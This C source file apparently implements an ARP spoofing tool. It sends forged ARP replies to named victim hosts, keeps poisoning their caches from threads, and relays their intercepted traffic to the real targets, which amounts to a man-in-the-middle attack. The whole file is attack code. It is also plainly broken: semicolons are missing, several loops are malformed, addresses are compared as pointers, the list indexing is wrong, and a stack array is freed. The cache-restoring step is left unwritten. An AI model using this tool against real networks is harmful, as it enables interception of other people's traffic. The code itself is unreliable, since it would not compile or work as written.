#include "send_arp.h"




int main(int argc, char *argv[]) {

	/*
	Different steps.
	1. get_ether_addr, get_ip_addr is the same
	2. get each of the sender-target list
	3. 
	*/

	//uint8_t* my_ether still.
	uint8_t my_ether[6]
	uint8_t my_ip[4];
	char errbuf[PCAP_ERRBUF_SIZE];


	//request packet.
	struct rq_packet rq_p;
	// only get once.
	char *dev;
	// The same.( may be go to the funciton)
	uint8_t broadcast_ether[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

	// have to be many.	uint8_t send_ip[4]; uint8_t target_ip[4];	uint8_t sender_ether[6];	uint8_t target_ether[6];
	struct spoof_list *sp_list;

	//step zero.
	if(argc<4) {
		//Should have syntax: send_arp <interface> <send ip> <target ip> <send ip2> <target ip2> ...
		usage(); 
		return -1;
	}
	printf("MY Interface : %s\n", argv[1]);
	// Argc is bigger now.
	// argc cannot be even.
	for(int i = 2; i<argc-1; i=i+2) {
		printf("Sender(victim) IP : %s\n", argv[i]);
		printf("FAKE Target IP : %s\n", argv[i+1]);
	}

	sp_len = (argc-2)/2
	sp_list = (struct spoof_list *)malloc(sp_len * sizeof(struct spoof_list));

	//input each of them in to the list.
	for(int i = 0; i<sp_len; i=i+2) {
		inet_aton(argv[i+2], (in_addr *)sp_list[i].sender_ip_addr);
		inet_aton(argv[i+3], (in_addr *)sp_list[i].target_ip_addr);
	}


	dev = argv[1];
	get_dev_ether_addr(my_ether, dev);
	print_ether(my_ether);
	get_dev_ip_addr(my_ip, dev);
	printf("my ip ");
	print_ip(my_ip);

	pcap_t*	handle = pcap_open_live(argv[1],BUFSIZ,1,1000,errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	//1,2 send recive ARP
	for(int i = 0, i<sp_len ; i++) {
		//make a new function
		send_recv_arp(handle, &rq_p, sp_list[i], my_ip, my_ether);
//		print_arp(&rq_p);
		sp_list[i].sender_ether_addr = rq_p.eth_header.ether_dhost;
		send_recv_target_arp(handle, &rq_p, sp_list[i], my_ip, my_ether);
		sp_list[i].target_ether_addr = rq_p.eth_header.ether_dhost;
	}

	for(int i = 0, i<sp_len ; i++) {
		printf("Sender ethernet address &d : ", i);
		print_ether(sp_list[i].sender_ether_addr);
	}
	for(int i = 0, i<sp_len ; i++) {
		printf("Target ethernet address &d : ", i);
		print_ether(sp_list[i].target_ether_addr);
	}

	//send ARP reply	
	for(int i = 0, i<sp_len ; i++) {
		send_arp_rply(handle, sp_list[i], my_ether);
	}

	//3. Thread reply.
	pthread_t th[100];
	struct thread_spoof_arg sp_p[100]; //(pcap_t *handle, struct spoof_list list, my_ether) each thread.
	
	for(int i=0; i<sp_len; i++) {
		sp_p[i].handle = handle;
		sp_p[i].list = sp_list[i];
		sp_p[i].my_ether = my_ether;
		if (pthread_create(&th[i], NULL, thread_reply, (void *)&sp_p[i]) < 0) {
			perror("thread create error:");
		}
	}

	//4. redirect
	struct pcap_pkthdr *redir;
	const uint8_t* get_packet;
	while(1){
		int tmp = pcap_next_ex(handle, &redir, &get_packet);
		if(tmp<1) continue;
		struct libnet_ethernet_hdr* tmp_eth = (struct libnet_ethernet_hdr *)get_packet;
		for(int i = 0, i<sp_len ; i++) {
			//check sender ether addr and target ip addr
			if( tmp_eth->ether_shost != sp_list[i].sender_ether_addr ) continue;
			struct ARP_Header tmp_arp = (struct ARP_Header *)(get_packet + sizeof(libnet_ethernet_hdr));
			if( tmp_arp->dest_ip_addr != sp_list[i].target_ip_addr ) continue;
			// change source ether_addr to my_ether_addr
			memcpy(tmp_eth->ether_shost, my_ether, 6);
			memcpy(tmp_eth->ether_dhost, sp_list[i].target_ether_addr, 6);
			// send packet to the target
			pcap_sendpacket(handle, &get_packet, sizeof(get_packet));
		}
	}

	//5. repair.
	//not yet
	
	//6. free
	int status;
	for(int i=0;i<sp_len;i++){
		pthread_join(th[i],(void **)&status);
	}
	free(sp_list);
	free(sp_p);
	pcap_close(handle);
	return 0;
}
